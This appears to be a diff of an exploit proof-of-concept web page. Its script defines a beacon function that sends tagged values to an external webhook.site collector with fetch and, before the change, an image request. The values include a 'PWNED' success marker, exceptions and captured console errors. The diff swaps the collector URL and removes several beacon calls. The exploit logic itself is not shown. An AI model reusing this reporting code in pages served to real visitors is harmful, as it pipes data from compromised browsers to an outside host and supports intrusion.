@@ -1,9 +1,8 @@
 <html><body><script>
-const SINK = 'https://webhook.site/ba41f60a-8179-4fb4-8e46-be78a2fe067f';
+const SINK = 'https://webhook.site/17cfe592-ed97-4e13-8980-6daacc4312f1';
 function enc(s){ return encodeURIComponent(String(s).slice(0,160)); }
 function beacon(tag, val){
   try { fetch(SINK + '?t=' + enc(tag) + '&v=' + enc(val), {mode:'no-cors'}); } catch(e) {}
-  try { new Image().src = SINK + '?t=i_' + enc(tag) + '&v=' + enc(val); } catch(e) {}
 }
 var ERRS = [];
 console.error = function(m){ ERRS.push(String(m)); };
@@ -227,8 +226,6 @@ else { beacon('PWNED', 'write path uncertain'); }
 } catch(e) {
   beacon('exc', String(e).slice(0,120));
 }
-beacon('errs', ERRS.join(';').slice(0,150));
 </script>
 <script>
-window.addEventListener('load', function(){ setTimeout(function(){ beacon('page_done','ok'); }, 400); });
 </script></body></html>
